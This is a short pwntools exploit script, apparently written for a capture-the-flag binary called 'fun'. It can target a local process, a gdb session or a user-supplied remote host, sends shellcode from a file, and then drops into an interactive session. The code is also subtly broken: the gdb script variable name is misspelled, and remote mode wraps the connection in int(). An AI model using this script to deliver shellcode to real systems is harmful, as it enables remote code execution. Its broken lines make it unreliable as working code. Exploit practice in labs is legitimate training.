from pwn import *
import sys

context.binary = binary = ELF("./fun", checksec=False)

gdbscrript = """
b main
b execute
"""

mode = "l"

if (len(sys.argv) > 1) and (sys.argv[1].lower() in ["l", "d", "r"]):
	mode = sys.argv[1].lower()
else:
	print(f"\nUsage: python {sys.argv[0]} [MODE]")
	print("\tModes:")
	print("\t\tl\t:\tLocal Mode (default)")
	print("\t\td\t:\tDebug Mode")
	print("\t\tr\t:\tRemote Mode")


if mode == 'd':
	p = gdb.debug(binary.path, gdbscript=gdbscript)
elif mode == 'r':
	address = input("Target Address: ")
	port = input("Target Port: ")
	p = int(remote(address, port))
elif mode == 'l':
	p = process(binary.path)

p.recvuntil(b'run:')

with open("./shellcode", "rb") as f:
    payload = f.read()
    
p.sendline(payload)

p.interactive()
